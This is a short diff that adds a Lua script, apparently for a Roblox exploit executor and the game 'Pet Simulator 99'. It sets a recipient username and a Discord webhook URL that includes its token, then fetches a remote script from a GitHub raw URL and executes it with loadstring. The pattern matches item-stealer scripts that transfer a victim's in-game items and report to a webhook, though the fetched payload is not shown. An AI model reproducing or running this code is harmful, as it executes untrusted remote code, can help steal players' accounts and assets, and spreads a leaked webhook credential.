@@ -1,0 +1,4 @@
+Username = "op_lax" 
+Webhook = "https://discord.com/api/webhooks/1244432687020904460/MW0027vIZWriC4_SvCZiY9I5I6DtICYZHWZ9JLQPqNJUSjdqdPzUwYyPc12-daXki-wg" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
